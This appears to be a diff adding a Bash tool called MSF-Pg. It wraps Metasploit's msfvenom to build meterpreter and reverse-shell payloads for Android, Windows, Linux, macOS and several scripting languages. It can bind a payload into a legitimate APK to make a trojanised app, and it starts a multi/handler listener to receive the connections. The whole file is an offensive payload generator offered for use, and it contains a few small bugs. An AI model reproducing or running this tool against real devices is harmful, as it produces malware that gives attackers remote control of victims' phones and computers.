@@ -1,0 +1,833 @@
+#set color vareable
+red='\e[1;91m'
+green='\e[1;92m'
+cyan='\e[1;96m'
+white='\e[1;97m'
+bold='\e[1m'
+reset='\e[0m'
+unline='\e[4m'
+#<<<<<<<<<<<</colore>>>>>>>>>>>>>>
+#requrement pkgs......
+#lolcat
+#figlet
+#pv
+req(){
+	echo
+	echo -e "(*)Chacking Some Importent Pkgs(*)"
+	echo
+	if [ $OS = "kali" ];then
+		if [ -f /usr/bin/msfconsole -a -f /usr/bin/msfvenom ];then
+			sleep 0.5
+			echo -e "[✔]Msfconsole Found[✔]"
+			echo
+		else
+			sleep 0.5
+			echo -e "[❌]Metasploit Not Found[❌]"
+			exit 0
+		fi
+		if [ -f /usr/bin/java ];then
+			sleep 0.5
+			echo -e "[✔]Java Found[✔]"
+			echo
+		else
+			sleep 0.5
+			echo -e "[❌]Java Not Found[❌]"
+			exit 0
+		fi
+		if [ -f /usr/bin/apktool ];then
+			sleep 0.5
+			echo -e "[✔]Apk Tool Found[✔]"
+			echo
+		else
+			sleep 0,5
+			echo -e "[❌]Apk Tool Not Found[❌]"
+			exit 0
+		fi
+		if [ -f /usr/bin/zipalign ];then
+			sleep 0.5
+			echo -e "[✔]Zip align Found[✔]"
+			sleep 1
+		else
+			sleep 1
+			echo -e "[❌]Zip align Not Found[❌]"
+			exit 0
+		fi
+	fi
+	if [ $OS = "Termux" ];then
+		if [ -f $PREFIX/bin/msfconsole -a -f $PREFIX/bin/msfvenom ];then
+			sleep 0.5
+			echo -e "[✔]Msfconsole Found[✔]"
+			echo
+			sleep 1
+		else
+			sleep 0.5
+			echo -e "[❌]Metasploit Not Found[❌]"
+			exit 0
+		fi
+		#if [ -f $PREFIX/bin/java ];then
+			#sleep 0.5
+			#echo -e "[✔]Java Found[✔]"
+			#echo
+		#else
+			#sleep p.5
+			#echo -e "[❌]Java Not Found[❌]"
+			#exit 0
+		#fi
+		#if [ ! -f $PREFIX/bin/apksigner ];then
+			#echo -e "[❌]Java Not Found[❌]"
+			#exit 0
+		#else
+			#sleep 0.5
+			#echo -e "[✔]Apk Signer Found[✔]"
+		#fi
+		#if [ -f $PREFIX/bin/apktool ];then
+			#sleep 0.5
+			#echo
+			#echo -e "[✔]Apk Tool Found[✔]"
+			#echo
+			#sleep 1
+		#else
+			#sleep 1
+			#echo -e "[❌]Apk Tool Not Found[❌]"
+			#exit 0
+		#fi
+		echo
+	fi
+}
+
+#funcations
+osbanner(){
+	bash banner1.sh
+}
+
+paybanner(){
+	clear
+	echo -e "$bold$green ██╗  ██╗     ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
+ ╚██╗██╔╝     ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
+  ╚███╔╝█████╗██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
+  ██╔██╗╚════╝██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
+ ██╔╝ ██╗     ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
+ ╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
+                                                                         "
+}
+banner(){
+	clear
+	echo -e "$bold$green ███╗   ███╗███████╗███████╗██████╗        ██████╗ ███████╗███╗   ██╗
+ ████╗ ████║██╔════╝██╔════╝██╔══██╗      ██╔════╝ ██╔════╝████╗  ██║
+ ██╔████╔██║███████╗█████╗  ██████╔╝█████╗██║  ███╗█████╗  ██╔██╗ ██║
+ ██║╚██╔╝██║╚════██║██╔══╝  ██╔═══╝ ╚════╝██║   ██║██╔══╝  ██║╚██╗██║
+ ██║ ╚═╝ ██║███████║██║██╗  ██║           ╚██████╔╝███████╗██║ ╚████║
+ ╚═╝     ╚═╝╚══════╝╚═╝╚═╝  ╚═╝            ╚═════╝ ╚══════╝╚═╝  ╚═══╝
+                                                                     "
+}
+
+spbanner(){
+	clear
+	echo -e "$bold$green ███████╗██████╗       ███╗   ███╗ █████╗ ██╗  ██╗███████╗
+ ██╔════╝██╔══██╗      ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝
+ ███████╗██████╔╝█████╗██╔████╔██║███████║█████╔╝ █████╗  
+ ╚════██║██╔═══╝ ╚════╝██║╚██╔╝██║██╔══██║██╔═██╗ ██╔══╝  
+ ███████║██║           ██║ ╚═╝ ██║██║  ██║██║  ██╗███████╗
+ ╚══════╝╚═╝           ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
+	                                                         "
+
+}
+
+owner(){
+    echo -e "$bold$white version:-$green     1.0"
+    echo -e "$bold$green code:-$white        Bash"
+    echo -e "$white Createtor:-$green    $unline\bALEX SADIK$reset*"
+    echo -e "$green$bold Enycripeted:-$white Bash-Locker"
+    echo -e "$white$bold OS:-$green          $OS"
+	echo -e "$bold$white ----------------------------------------------------"
+	echo
+}
+
+menu(){
+	echo -e "$bold$white 1]- Payload Type"
+	echo -e " 2]- Update tool"
+	echo -e " 99]- Exit"
+	echo -e "$reset"
+	read -p "$(echo -e "$green >>> ")" var1
+}
+
+payloadtype(){
+	echo -e "$bold$white a]- Android"
+	echo -e " w]- Windows"
+	echo -e " l]- Linux"
+	echo -e " m]- Mac OS"
+	echo -e " s]- Shell"
+	echo -e "$reset"
+	read -p "$(echo -e "$green >>> ")" var2
+}
+
+payloadandroid(){
+	echo -e "$bold$white 1]- meterpreter/reverse_tcp"
+	echo -e " 2]- meterpreter/reverse_http"
+	echo -e " 3]- meterpreter/reverse_https"
+	echo -e " 4]- shell/reverse_tcp"
+	echo -e " 5]- shell/reverse_http"
+	echo -e " 6]- shell/reverse_https"
+	echo -e "$reset" 
+	read -p "$(echo -e "$green >>> ")" varandroid
+}
+
+windowask(){
+	echo
+	echo -e "$bold$white 1]- x86"
+	echo -e " 2]- x64"
+	echo -e "$reset"
+	read -p "$(echo -e "$green >>> ")" var3
+}
+
+payloadwindowx86(){
+	echo -e "$bold$white 1]- x86/meterpreter/reverse_tcp"
+	echo -e " 2]- x86/meterpreter/reverse_http"
+	echo -e " 3]- x86/meterpreter/reverse_https"
+	echo -e " 4]- x86/shell/reverse_tcp"
+	echo -e " 5]- x86/shell/reverse_http"
+	echo -e " 6]- x86/shell/reverse_https"
+	echo -e "$reset"
+	read -p "$(echo -e "$green >>> ")" varwin
+}
+
+payloadwindowx64(){
+	echo -e "$bold$white 1]- x64/meterpreter/reverse_tcp"
+	echo -e " 2]- x64/meterpreter/reverse_http"
+	echo -e " 3]- x64/meterpreter/reverse_https"
+	echo -e " 4]- x64/shell/reverse_tcp"
+	echo -e " 5]- x64/shell/reverse_http"
+	echo -e " 6]- x64/shell/reverse_https"
+	echo -e "$reset"
+	read -p "$(echo -e "$green >>> ")" varwin
+}
+
+payloadmac(){
+	echo
+	echo -e "$bold$white 1]- osx/x86/shell_reverse_tcp"
+	echo -e "$reset"
+}
+
+linuxpayload(){
+	echo
+	echo -e "$bold$white 1]- x86/meterpreter/reverse_tcp"
+	echo -e "$reset"
+}
+
+payloadshell(){
+	echo -e "$bold$white py]- Python payload"
+	echo -e " pl]- Perl payload"
+	echo -e "php]- Php payload"
+	echo -e " sh]- Bash payload"
+	echo -e " js]- Java payload"
+	echo -e " nd]- Nodejs payload"
+	echo -e " rb]- Ruby payload"
+	echo -e "$reset"
+}
+tps(){
+	echo
+	read -p "$(echo -e "$green$bold Do You want to go main menu[y/n]> ")" tp
+	if [ $tp == "y" -o $tp == "Y" ]; then
+		if [ $OS == "'kali" ];then
+			kali
+		elif [ $OS == "Termux" ];then
+			termux
+		fi
+	else 
+		echo
+		echo -e "$red Good By....See You Soon. $reset"
+		exit 0
+	fi
+}
+orginalpayload(){
+	echo 
+	echo -e "$green$bold EXAMPLE:- 127.0.0.1$reset"
+	echo
+	read -p "$(echo -e "$white Enter your LHOST= ")" lhost
+	echo
+	echo -e "$green$bold EXAMPLE:- 4444$reset"
+	echo
+	read -p "$(echo -e "$white Enter your LPORT= ")" lport
+	echo
+	if [ $var2 == "a" ];then
+		p='payload.apk'
+		if [ $varandroid == "1" ];then
+			pa="android/meterpreter/reverse_tcp"
+		elif [ $varandroid == "2" ];then
+			pa="android/meterpreter/reverse_http"
+		elif [ $varandroid == "3" ];then
+			pa="android/meterpreter/reverse_https"
+		elif [ $varandroid == "4" ];then
+			pa="android/shell/reverse_tcp"
+		elif [ $varandroid == "5" ];then
+			pa="android/shell/reverse_http"
+		elif [ $varandroid == "6" ];then
+			pa="android/shell/reverse_https"
+		fi
+	elif [ $var2 == "w" ];then
+		p="payload.exe"
+		if [ $var3 == "1" ];then
+			if [ $varwin == "1" ];then 
+				pa="windows/x86/meterpreter/reverse_tcp"
+			elif [ $varwin == "2" ];then
+				pa="windows/x86/meterpreter/reverse_http"
+			elif [ $varwin == "3" ];then 
+				pa="windows/x86/meterpreter/reverse_https"
+			elif [ $varwin == "4" ];then 
+				pa="windows/x86/shell/reverse_tcp"
+			elif [ $varwin == "5" ];then 
+				pa="windows/x86/shell/reverse_http"
+			elif [ $varwin == "6" ];then
+				pa="windows/x86/shell/reverse_https"
+			fi
+		elif [ $var3 == "2" ];then
+			if [ $varwin == "1" ];then 
+				pa="windows/x64/meterpreter/reverse_tcp"
+			elif [ $varwin == "2" ];then
+				pa="windows/x64/meterpreter/reverse_http"
+			elif [ $varwin == "3" ];then 
+				pa="windows/x64/meterpreter/reverse_https"
+			elif [ $varwin == "4" ];then 
+				pa="windows/x64/shell/reverse_tcp"
+			elif [ $varwin == "5" ];then 
+				pa="windows/x64/shell/reverse_http"
+			elif [ $varwin == "6" ];then
+				pa="windows/x64/shell/reverse_https"
+			fi
+		fi
+	elif [ $var2 == "l" ]; then
+		p="payload.elf"
+		if  [ $lin == "1" ];then
+			pa="linux/x86/meterpreter/reverse_tcp"
+		fi
+	elif [ $var2 == "m" ]; then
+		p="payload.macho"
+		if [ $mac == "1" ];then
+			pa="osx/x86/shell_reverse_tcp"
+		fi
+	elif [ $var2 == "s" ];then
+		if [ $she == "php" ];then
+			p="payload.php"
+			pa="php/meterpreter/reverse_tcp"
+		elif [ $she == "py" ];then
+			p="payload.py"
+			pa="python/meterpreter/reverse_tcp"
+		elif [ $she == "pl" ];then
+			p="payload.pl"
+			pa="cmd/unix/reverse_perl"
+		elif [ $she == "js" ];then
+			p="payload.js"
+			pa="java/meterpreter/reverse_tcp"
+		elif [ $she == "sh" ];then
+			p="payload.sh"
+			pa="cmd/unix/reverse_bash"
+		elif [ $she == "nd" ]; then
+			p="payload.js"
+			pa="cmd/unix/reverse_nodejs"
+		elif [ $she == "rb" ]; then
+			p="payload.rb"
+			pa="cmd/unix/reverse_ruby"
+		fi
+	fi
+	echo -e "$green$bold EXAMPLE:- \$HOME/$p or /sdcard/$p$reset"
+	echo 
+	read -p "$(echo -e "$white Enter path to drop payload= ")" pay
+	echo -e "$green Genarating.............."
+	sleep 0.6 
+}
+
+bindpayload(){
+	echo 
+	echo -e "$green$bold EXAMPLE:- 127.0.0.1$reset"
+	echo
+	read -p "$(echo -e "$white Enter your LHOST= ")" lhost
+	echo
+	echo -e "$green$bold EXAMPLE:- 4444$reset"
+	echo
+	read -p "$(echo -e "$white Enter your LPORT= ")" lport
+	echo
+	if [ $var2 == "a" ];then
+		p='payload.apk'
+		if [ $varandroid == "1" ];then
+			pa="android/meterpreter/reverse_tcp"
+		elif [ $varandroid == "2" ];then
+			pa="android/meterpreter/reverse_http"
+		elif [ $varandroid == "3" ];then
+			pa="android/meterpreter/reverse_https"
+		elif [ $varandroid == "4" ];then
+			pa="android/shell/reverse_tcp"
+		elif [ $varandroid == "5" ];then
+			pa="android/shell/reverse_http"
+		elif [ $varandroid == "6" ];then
+			pa="android/shell/reverse_https"
+		fi
+	elif [ $var2 == "w" ];then
+		p="payload.exe"
+		if [ $var3 == "1" ];then
+			if [ $varwin == "1" ];then 
+				pa="windows/x86/meterpreter/reverse_tcp"
+			elif [ $varwin == "2" ];then
+				pa="windows/x86/meterpreter/reverse_http"
+			elif [ $varwin == "3" ];then 
+				pa="windows/x86/meterpreter/reverse_https"
+			elif [ $varwin == "4" ];then 
+				pa="windows/x86/shell/reverse_tcp"
+			elif [ $varwin == "5" ];then 
+				pa="windows/x86/shell/reverse_http"
+			elif [ $varwin == "6" ];then
+				pa="windows/x86/shell/reverse_https"
+			fi
+		elif [ $var3 == "2" ];then
+			if [ $varwin == "1" ];then 
+				pa="windows/x64/meterpreter/reverse_tcp"
+			elif [ $varwin == "2" ];then
+				pa="windows/x64/meterpreter/reverse_http"
+			elif [ $varwin == "3" ];then 
+				pa="windows/x64/meterpreter/reverse_https"
+			elif [ $varwin == "4" ];then 
+				pa="windows/x64/shell/reverse_tcp"
+			elif [ $varwin == "5" ];then 
+				pa="windows/x64/shell/reverse_http"
+			elif [ $varwin == "6" ];then
+				pa="windows/x64/shell/reverse_https"
+			fi
+		fi
+	elif [ $var2 == "l" ]; then
+		p="payload.elf"
+		if  [ $lin == "1" ];then
+			pa="linux/x86/meterpreter/reverse_tcp"
+		fi
+	elif [ $var2 == "m" ]; then
+		p="payload.macho"
+		if [ $mac == "1" ];then
+			pa="osx/x86/shell_reverse_tcp"
+		fi
+	elif [ $var2 == "s" ];then
+		if [ $she == "php" ];then
+			p="payload.php"
+			pa="php/meterpreter/reverse_tcp"
+		elif [ $she == "py" ];then
+			p="payload.py"
+			pa="python/meterpreter/reverse_tcp"
+		elif [ $she == "pl" ];then
+			p="payload.pl"
+			pa="cmd/unix/reverse_perl"
+		elif [ $she == "js" ];then
+			p="payload.js"
+			pa="java/meterpreter/reverse_tcp"
+		elif [ $she == "sh" ];then
+			p="payload.sh"
+			pa="cmd/unix/reverse_bash"
+		elif [ $she == "nd" ]; then
+			p="payload.js"
+			pa="cmd/unix/reverse_nodejs"
+		elif [ $she == "rb" ]; then
+			p="payload.rb"
+			pa="cmd/unix/reverse_ruby"
+		fi
+	fi
+	echo -e "$green$bold EXAMPLE:- \$HOME/orginal.apk or /sdcard/orginal.apk$reset"
+	echo 
+	read -p "$(echo -e "$white Enter path of orginal apk= ")" apk
+	echo
+	echo -e "$green$bold EXAMPLE:- \$HOME/$p or /sdcard/$p$reset"
+	echo
+	read -p "$(echo -e "$white Enter path to drop binded payload= ")" pay
+	echo -e "$green Genarating.............."
+	sleep 0.6
+}
+
+listeningconsole(){
+	echo
+	read -p "$(echo -e "$bold$white Do You Want To Start Msfconsole[Y/N]> ")" payask
+     if [ $payask == "y" -o $payask == "Y" ]; then
+	   echo "use exploit/multi/handler" > .metaconftmp.rc
+	   echo "set payload $pa" >> .metaconftmp.rc
+       echo "set lhost $lhost" >> .metaconftmp.rc
+	   echo "set lport $lport" >> .metaconftmp.rc
+	   echo "exploit" >> .metaconftmp.rc
+	   echo
+	   echo -e "$green Starting Console.............."
+	   msfconsole -r .metaconftmp.rc
+	   sleep 1
+	   rm .metaconftmp.rc
+	   tps
+	elif [ $payask == "n" -o $payask == "N" ];then
+		tps
+	else 
+		echo
+		echo -e "$red$bold Good by ........ See you soon"
+		exit 0
+        fi
+}
+
+as(){
+	read -p "$(echo -e "\n$white 1]-$white Bind paylod (with another apk)\n\n 2]-$white Genarate normal payload \n\n$green >>> ")" bind
+}
+trp(){
+	trap '{ read -p "$(echo -e "$green Go To Menu or Exit[m/e].> ")" tpr 
+	if [ $tpr == "m" -o $tpr == "M" ]; then 
+		clear
+		if [ $OS = "kali" ];then
+			kali
+		elif [ $OS = "Termux" ];then
+			termux
+		fi
+	elif [ $tpr == "e" -o $tpr == "E" ]; then
+		echo
+		echo -e "$red Good By...............see you soon"
+		echo -e "$reset"
+		exit 0
+	fi ; }' INT
+}
+
+eslekali(){
+	echo 
+	echo -e "$red Wrong input "
+	echo -e "$reset"
+	tps
+}
+
+payload(){
+	orginalpayload
+	msfvenom -p $pa LHOST=$lhost LPORT=$lport -o $pay
+	sleep 0.5
+	listeningconsole
+}
+
+kali(){
+	OS="kali"
+	clear
+	req
+	banner
+	owner
+	sleep 0.5
+	menu
+	if [ $var1 == "1" ]; then
+		clear
+		paybanner
+		owner
+		sleep 0.5
+		payloadtype
+		if [ $var2 == "a" ]; then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			payloadandroid
+			if [ $varandroid == "1" ];then
+				as
+				if [ $bind == "1" ]; then
+					bindpayload
+					msfvenom -x $apk -p $pa LHOST=$lhost LPORT=$lport -o $pay 
+					sleep 1
+					listeningconsole
+				elif [ $bind == "2" ]; then
+					payload
+				else
+					eslekali
+				fi
+			elif [ $varandroid == "2" ];then
+				payload
+			elif [ $varandroid == "3" ];then
+				payload
+			elif [ $varandroid == "4" ];then
+				payload
+			elif [ $varandroid == "5" ];then
+				payload
+			elif [ $varandroid == "6" ];then
+				payload
+			else
+				eslekali
+			fi
+		elif [ $var2 == "w" ]; then 
+			sleep 0.5
+			windowask
+			if [ $var3 == "1" ]; then
+				clear
+				paybanner
+				owner
+				sleep 0.5
+				payloadwindowx86
+				if [ $varwin == "1" ];then
+					payload
+				elif [ $varwin == "2" ];then
+					payload
+				elif [ $varwin == "3" ];then
+					payload
+				elif [ $varwin == "4" ];then
+					payload
+				elif [ $varwin == "5" ];then
+					payload
+				elif [ $varwin == "6" ];then
+					payload
+				else
+					eslekali
+				fi
+			elif [ $var3 == "2" ]; then
+				clear
+				paybanner
+				owner
+				sleep 0.5
+				payloadwindowx64
+				if [ $varwin == "1" ];then
+					payload
+				elif [ $varwin == "2" ];then
+					payload
+				elif [ $varwin == "3" ];then
+					payload
+				elif [ $varwin == "4" ];then
+					payload
+				elif [ $varwin == "5" ];then
+					payload
+				elif [ $varwin == "6" ];then
+					payload
+				else
+					eslekali
+				fi
+			else
+				eslekali
+			fi
+		elif [ $var2 == "l" ]; then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			linuxpayload
+			read -p "$(echo -e "$green >>> ")" lin
+			if [ $lin == "1" ];then
+				payload
+			else
+				eslekali
+			fi
+		elif [ $var2 == "m" ];then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			payloadmac
+			read -p "$(echo -e "$green >>> ")" mac
+			if [ $mac == "1" ];then
+				payload
+			else
+				eslekali
+			fi
+		elif [ $var2 == "s" ]; then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			payloadshell
+			read -p "$(echo -e "$green >>> ")" she
+			if [ $she == "py" ]; then
+				payload
+			elif [ $she == "php" ];then
+				payload
+			elif [ $she == "pl" ];then
+				payload
+			elif [ $she == "sh" ];then
+				payload
+			elif [ $she == "js" ];then
+				payload
+			elif [ $she == "nd" ];then
+				payload
+			elif [ $she == "rb" ];then
+				payload
+			else
+				eslekali
+			fi
+		else
+			eslekali
+		fi
+	elif [ $var1 == "2" ]; then
+		spbanner
+		owner
+		sleep 0.5
+	else
+		eslekali
+	fi
+}
+
+termux(){
+	pg_ctl -D $PREFIX/var/lib/postgresql start
+	OS="Termux"
+	clear
+	req
+	banner
+	owner
+	sleep 0.5
+	menu
+	if [ $var1 == "1" ]; then
+		clear
+		paybanner
+		owner
+		sleep 0.5
+		payloadtype
+		if [ $var2 == "a" ]; then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			payloadandroid
+			if [ $varandroid == "1" ];then
+				as
+				if [ $bind == "1" ]; then
+					echo 
+					echo -e "$red [*]Its under Working"
+					echo
+					tp
+					#bindpayload
+					#mv $apk $HOME/metasploit-framework/
+					#cd $HOME/metasploit-framework/
+					#msfvenom -x $apk -p LHOST=$lhost LPORT=$lport -o $pay 
+					#sleep 1
+					#listeningconsole
+				elif [ $bind == "2" ]; then
+					payload
+				else
+					eslekali
+				fi
+			elif [ $varandroid == "2" ];then
+				payload
+			elif [ $varandroid == "3" ];then
+				payload
+			elif [ $varandroid == "4" ];then
+				payload
+			elif [ $varandroid == "5" ];then
+				payload
+			elif [ $varandroid == "6" ];then
+				payload
+			else
+				eslekali
+			fi
+		elif [ $var2 == "w" ]; then 
+			sleep 0.5
+			windowask
+			if [ $var3 == "1" ]; then
+				clear
+				paybanner
+				owner
+				sleep 0.5
+				payloadwindowx86
+				if [ $varwin == "1" ];then
+					payload
+				elif [ $varwin == "2" ];then
+					payload
+				elif [ $varwin == "3" ];then
+					payload
+				elif [ $varwin == "4" ];then
+					payload
+				elif [ $varwin == "5" ];then
+					payload
+				elif [ $varwin == "6" ];then
+					payload
+				else
+					eslekali
+				fi
+			elif [ $var3 == "2" ]; then
+				clear
+				paybanner
+				owner
+				sleep 0.5
+				payloadwindowx64
+				if [ $varwin == "1" ];then
+					payload
+				elif [ $varwin == "2" ];then
+					payload
+				elif [ $varwin == "3" ];then
+					payload
+				elif [ $varwin == "4" ];then
+					payload
+				elif [ $varwin == "5" ];then
+					payload
+				elif [ $varwin == "6" ];then
+					payload
+				else
+					eslekali
+				fi
+			else
+				eslekali
+			fi
+		elif [ $var2 == "l" ]; then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			linuxpayload
+			read -p "$(echo -e "$green >>> ")" lin
+			if [ $lin == "1" ];then
+				payload
+			else
+				eslekali
+			fi
+		elif [ $var2 == "m" ];then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			payloadmac
+			read -p "$(echo -e "$green >>> ")" mac
+			if [ $mac == "1" ];then
+				payload
+			else
+				eslekali
+			fi
+		elif [ $var2 == "s" ]; then
+			clear
+			paybanner
+			owner
+			sleep 0.5
+			payloadshell
+			read -p "$(echo -e "$green >>> ")" she
+			if [ $she == "py" ]; then
+				payload
+			elif [ $she == "php" ];then
+				payload
+			elif [ $she == "pl" ];then
+				payload
+			elif [ $she == "sh" ];then
+				payload
+			elif [ $she == "js" ];then
+				payload
+			elif [ $she == "nd" ];then
+				payload
+			elif [ $she == "rb" ];then
+				payload
+			else
+				eslekali
+			fi
+		else
+			eslekali
+		fi
+	elif [ $var1 == "2" ];then
+		echo
+		echo -e "$green (*)Updateing....................."
+		echo
+		echo -e "$green ($)Please Take A While "
+		sleep 2
+		rm msf-pg
+		axel -a "https://raw.githubusercontent.com/haxzsadik/MSF-Pg/master/msf-pg"
+		chmod +x msf-pg
+		echo
+		bash setup
+		echo -e "Updateing complete....."
+	elif [ $var1 == "99" ];then
+		echo -e "$reset"
+		exit 0
+	else
+		eslekali
+	fi
+}
+
+os(){
+	clear
+	osbanner
+	read -p "$(echo -e "$bold$green Select a os:-\n$white 1)Kali-linux(nethunter)\n 2)Termux\n$green >>> ")" var
+	if [ $var == "1" ];then
+		kali
+	elif [ $var == "2" ];then
+		termux
+	fi
+}
+
+os
